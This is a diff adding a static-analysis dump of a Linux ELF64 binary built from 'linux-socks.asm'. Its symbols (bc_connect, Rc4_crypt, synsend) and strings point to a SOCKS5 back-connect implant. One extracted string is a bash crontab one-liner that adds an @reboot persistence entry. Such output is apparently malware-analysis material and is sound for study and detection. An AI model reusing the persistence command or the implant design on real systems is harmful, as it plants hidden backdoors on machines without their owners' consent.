@@ -1,0 +1,141 @@
+Missing bin header dwarf
+[Sections]
+
+nth paddr         size vaddr        vsize perm name
+―――――――――――――――――――――――――――――――――――――――――――――――――――
+0   0x00000000     0x0 0x00000000     0x0 ---- 
+1   0x000000e8    0x24 0x004000e8    0x24 -r-- .note.gnu.build-id
+2   0x00000110  0x123e 0x00400110  0x123e -r-x .text
+3   0x00001350   0x106 0x00601350   0x106 -rw- .data
+4   0x00001458   0x360 0x00000000   0x360 ---- .symtab
+5   0x000017b8   0x11e 0x00000000   0x11e ---- .strtab
+6   0x000018d6    0x3a 0x00000000    0x3a ---- .shstrtab
+
+[Segments]
+
+nth paddr         size vaddr        vsize perm name
+―――――――――――――――――――――――――――――――――――――――――――――――――――
+0   0x00000000  0x134e 0x00400000  0x134e -r-x LOAD0
+1   0x00001350   0x106 0x00601350   0x106 -rw- LOAD1
+2   0x000000e8    0x24 0x004000e8    0x24 -r-- NOTE
+3   0x00000000    0x40 0x00400000    0x40 -rw- ehdr
+
+[Entrypoints]
+vaddr=0x00400110 paddr=0x00000110 haddr=0x00000018 hvaddr=0x00400018 type=program
+
+1 entrypoints
+[Constructors]
+
+0 entrypoints
+[Main]
+vaddr=0x00400115 paddr=0x00000115
+[Imports]
+nth vaddr bind type lib name
+――――――――――――――――――――――――――――
+
+[Symbols]
+
+nth paddr      vaddr      bind   type   size lib name
+―――――――――――――――――――――――――――――――――――――――――――――――――――――
+1   0x000000e8 0x004000e8 LOCAL  SECT   0        .note.gnu.build-id
+2   0x00000110 0x00400110 LOCAL  SECT   0        .text
+3   0x00001350 0x00601350 LOCAL  SECT   0        .data
+4   ---------- 0x00000000 LOCAL  FILE   0        linux-socks.asm
+5   0x0000135f 0x0060135f LOCAL  OBJ    0        cron0
+6   0x000013ad 0x006013ad LOCAL  OBJ    0        cron1
+7   0x000013b1 0x006013b1 LOCAL  OBJ    0        cron2
+8   0x00001350 0x00601350 LOCAL  OBJ    0        _shPath
+9   0x00001447 0x00601447 LOCAL  OBJ    0        PORT
+10  0x00001452 0x00601452 LOCAL  OBJ    0        __HOST
+11  0x000013fd 0x006013fd LOCAL  OBJ    0        xordata
+12  0x00001437 0x00601437 LOCAL  OBJ    0        exception
+13  0x00000fcc 0x00400fcc GLOBAL FUNC   0        strlen_
+14  0x00001317 0x00401317 GLOBAL FUNC   0        RAND32
+15  0x0000101d 0x0040101d GLOBAL FUNC   0        copydata
+16  0x00001037 0x00401037 GLOBAL FUNC   0        ZeroMemory
+17  0x00000e43 0x00400e43 GLOBAL FUNC   0        synsend
+18  0x0000104e 0x0040104e GLOBAL FUNC   0        closeConnection
+19  0x00000278 0x00400278 GLOBAL FUNC   0        _connect
+20  0x00000724 0x00400724 GLOBAL FUNC   0        bc_connect
+21  0x000011b2 0x004011b2 GLOBAL FUNC   0        set_sighandler
+22  0x00000efe 0x00400efe GLOBAL FUNC   0        set_keepalive
+23  0x00000110 0x00400110 GLOBAL FUNC   0        _start
+24  ---------- 0x00601456 GLOBAL NOTYPE 0        __bss_start
+25  0x00000115 0x00400115 GLOBAL FUNC   0        main
+26  0x00000fb8 0x00400fb8 GLOBAL FUNC   0        create_thread
+27  0x0000130e 0x0040130e GLOBAL FUNC   0        _restorer
+28  0x00000fed 0x00400fed GLOBAL FUNC   0        _cmp_string
+29  0x00000340 0x00400340 GLOBAL FUNC   0        newConnection
+30  0x00001102 0x00401102 GLOBAL FUNC   0        _sig_handler
+31  0x0000107d 0x0040107d GLOBAL FUNC   0        _write
+32  ---------- 0x00601456 GLOBAL NOTYPE 0        _edata
+33  ---------- 0x00601458 GLOBAL NOTYPE 0        _end
+34  0x000012d9 0x004012d9 GLOBAL FUNC   0        atoi
+35  0x00000d54 0x00400d54 GLOBAL FUNC   0        Rc4_crypt
+[Strings]
+nth paddr      vaddr      len size section type  string
+―――――――――――――――――――――――――――――――――――――――――――――――――――――――
+0   0x00001350 0x00601350 14  15   .data   ascii /tmp/socks5.sh
+1   0x0000135f 0x0060135f 157 158  .data   ascii #!/bin/bash\n\ncat <(echo '@reboot echo socks5_backconnect666 > /dev/null | (cd  && )') <(sed '/socks5_backconnect666/d' <(crontab -l 2>/dev/null)) | crontab -
+2   0x00001437 0x00601437 9   10   .data   ascii error.log
+3   0x00001441 0x00601441 10  11   .data   ascii PORT1:4202
+4   0x0000144c 0x0060144c 6   7    .data   ascii HOST1:
+arch     x86
+baddr    0x400000
+binsz    6416
+bintype  elf
+bits     64
+canary   false
+class    ELF64
+crypto   false
+endian   little
+havecode true
+laddr    0x0
+lang     c
+linenum  true
+lsyms    true
+machine  AMD x86-64 architecture
+nx       false
+os       linux
+pic      false
+relocs   true
+rpath    NONE
+sanitize false
+static   true
+stripped false
+subsys   linux
+va       true
+0x00000000  ELF64       0x464c457f
+0x00000010  Type        0x0002
+0x00000012  Machine     0x003e
+0x00000014  Version     0x00000001
+0x00000018  Entrypoint  0x00400110
+0x00000020  PhOff       0x00000040
+0x00000028  ShOff       0x00001910
+0x00000030  Flags       0x00000000
+0x00000034  EhSize      64
+0x00000036  PhentSize   56
+0x00000038  PhNum       3
+0x0000003a  ShentSize   64
+0x0000003c  ShNum       7
+0x0000003e  ShrStrndx   6
+[Linked libraries]
+
+0 library
+[Relocations]
+
+vaddr paddr type name
+―――――――――――――――――――――
+
+
+0 relocations
+6416
+Section to Segment mapping:
+Segment Section
+---------------
+LOAD0   .note.gnu.build-id .text 
+LOAD1   .data 
+NOTE    .note.gnu.build-id 
+ehdr    
+
+
